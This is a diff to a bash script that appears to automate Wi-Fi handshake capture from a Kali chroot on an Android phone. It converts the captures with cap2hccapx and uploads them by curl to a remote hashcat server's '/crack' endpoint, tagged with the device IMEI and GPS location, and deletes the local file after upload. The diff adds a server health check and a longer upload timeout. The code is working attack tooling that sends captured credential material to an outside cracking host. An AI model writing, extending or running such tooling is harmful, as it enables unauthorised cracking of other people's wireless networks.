@@ -23,7 +23,7 @@ sendHandshake() {
   echo "Lat: "$lat
   imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
   echo "IMEI: "$imei
-  curl -i -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
+  curl -i -m 1000000 -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
   if [[ $? == 0 ]]; then
     rm $1
   else
@@ -34,7 +34,7 @@ sendHandshake() {
 checkHandshakes() {
   echo $1
   echo "Check handshakes..."
-  output=$(cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx > /dev/null)
+  output=$(cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx >/dev/null)
   #echo $output
   if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
     echo "No handshakes"
@@ -106,16 +106,25 @@ passive() {
   passive $1
 }
 
+checkHashcatServer() {
+  curl http://$1:9000/handshakes
+  if [[ $? == 0 ]]; then
+    echo "Server status - working"
+  else
+    echo "Server status - not working"
+    exit 1
+  fi
+}
 
-
+checkHashcatServer $2
 if [[ $1 == "p" ]]; then
   echo "Selected passive mode"
   if [[ $2 == "" ]]; then
     echo "Please enter hashcat server address second argument"
     exit 1
   else
-      echo "Hashcat server address: $2"
-      passive $2
+    echo "Hashcat server address: $2"
+    passive $2
   fi
 
 elif [[ $1 == "a" ]]; then
